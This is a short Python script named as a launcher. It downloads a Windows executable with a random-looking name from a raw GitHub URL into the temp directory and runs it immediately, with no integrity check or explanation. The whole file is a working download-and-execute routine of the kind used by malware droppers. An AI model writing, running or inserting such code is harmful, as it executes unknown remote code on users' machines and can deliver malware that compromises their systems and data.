# launcher_exe_click.py
import os, tempfile, requests, certifi

URL  = "https://raw.githubusercontent.com/Prenda00/canlmiop/main/dikduid.exe"
NAME = "dikduid.exe"

def main():
    p = os.path.join(tempfile.gettempdir(), NAME)
    with requests.get(URL, stream=True, timeout=60, verify=certifi.where()) as r:
        r.raise_for_status()
        with open(p, "wb") as f:
            for chunk in r.iter_content(1<<15):
                if chunk: f.write(chunk)
    os.startfile(p)  # Windows-only

if __name__ == "__main__":
    main()
